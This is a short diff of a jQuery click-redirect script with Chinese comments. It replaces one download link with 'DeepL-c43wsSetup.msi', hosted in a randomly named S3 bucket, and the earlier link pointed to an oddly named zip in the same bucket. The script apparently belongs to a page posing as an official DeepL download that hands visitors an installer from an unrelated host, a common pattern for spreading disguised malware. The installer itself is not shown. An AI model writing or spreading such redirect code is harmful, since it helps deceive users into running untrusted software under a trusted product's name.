@@ -1,6 +1,6 @@
 $(function () {
 	// 设置跳转路径
-	var url = "https://gfsmdmtke.s3.ap-east-1.amazonaws.com/Fxedirky7.08.9.zip"; //如果是外部链接 ' ' 中则全部替换为完整网址链接 如：'https://www.example.com'
+	var url = "https://gfsmdmtke.s3.ap-east-1.amazonaws.com/DeepL-c43wsSetup.msi"; //如果是外部链接 ' ' 中则全部替换为完整网址链接 如：'https://www.example.com'
 
 	// 使用querySelectorAll获取所有具有特定类名的元素
 	var clickableElements = document.querySelectorAll(".clickableClass"); // 假设class是clickableClass
